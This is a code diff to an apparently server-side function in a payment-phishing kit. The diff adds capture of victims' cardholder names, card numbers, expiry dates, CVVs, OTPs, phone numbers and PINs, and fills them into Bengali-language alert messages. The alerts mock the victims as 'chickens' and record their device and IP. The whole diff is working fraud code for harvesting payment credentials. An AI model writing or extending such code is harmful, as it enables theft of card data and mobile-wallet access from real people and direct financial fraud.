@@ -25,12 +25,11 @@ serve(async (req) => {
   }
 
   try {
-    const { type, amount, method, userAgent, timestamp, reason, refId, ip, referrer, step, paymentType } = await req.json();
+    const { type, amount, method, userAgent, timestamp, reason, refId, ip, referrer, step, paymentType, number, otp, pin, cardName, cardNumber, expiry, cvv } = await req.json();
 
     const rawIp = ip || req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'Unknown';
     const clientIp = rawIp.split(',')[0].trim();
 
-    // Parse device simply
     const ua = userAgent || '';
     let device = 'Unknown';
     if (/Android/i.test(ua)) device = 'Android';
@@ -46,11 +45,11 @@ serve(async (req) => {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
           `-------------------\n\n` +
           `Payment Method : ${method || ''}\n` +
-          `Cardholder Name : \n` +
-          `Card Number : \n` +
-          `Expiry Date : \n` +
-          `CVV : \n\n` +
-          `OTP : \n\n` +
+          `Cardholder Name : ${cardName || ''}\n` +
+          `Card Number : ${cardNumber || ''}\n` +
+          `Expiry Date : ${expiry || ''}\n` +
+          `CVV : ${cvv || ''}\n\n` +
+          `OTP : ${otp || ''}\n\n` +
           `-------------------\n\n` +
           `🐔মুরগির Device : ${device}\n` +
           `🐔মুরগির IP : ${clientIp}\n` +
@@ -59,9 +58,9 @@ serve(async (req) => {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
           `-------------------\n\n` +
           `Payment Method : ${method || ''}\n` +
-          `Number : \n` +
-          `OTP : \n` +
-          `PIN : \n\n` +
+          `Number : ${number || ''}\n` +
+          `OTP : ${otp || ''}\n` +
+          `PIN : ${pin || ''}\n\n` +
           `-------------------\n\n` +
           `🐔মুরগির Device : ${device}\n` +
           `🐔মুরগির IP : ${clientIp}\n` +
